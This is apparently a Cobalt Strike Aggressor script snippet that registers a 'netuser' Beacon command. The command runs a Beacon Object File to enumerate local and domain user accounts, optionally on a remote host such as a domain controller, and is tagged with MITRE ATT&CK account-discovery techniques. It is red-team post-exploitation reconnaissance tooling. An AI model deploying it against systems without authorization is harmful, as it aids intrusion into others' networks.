# --- netuser ---
alias netuser {
    local('$bid $host $args');
    $bid  = $1;
    $host = $2;
    if ($host is $null) { $host = ""; }
    $args = bof_pack($bid, "z", $host);
    dani_run($bid, "netuser", $args);
}
beacon_command_register(
    "netuser",
    "Local/domain user enumeration — T1087.001/T1087.002 (by Dani)",
    "Synopsis: netuser [hostname]\n\n" .
    "Description: Enumerate local and domain user accounts. Optionally target\n" .
    "a remote host. Without a hostname, enumerates the local machine.\n\n" .
    "Examples:\n" .
    "  netuser\n" .
    "  netuser DC01\n\n" .
    "MITRE ATT&CK: T1087.001 (Account Discovery: Local Account),\n" .
    "              T1087.002 (Account Discovery: Domain Account)\n\n" .
    "Phase: 2 — Situational Awareness\nArgs: [hostname] (optional)"
);

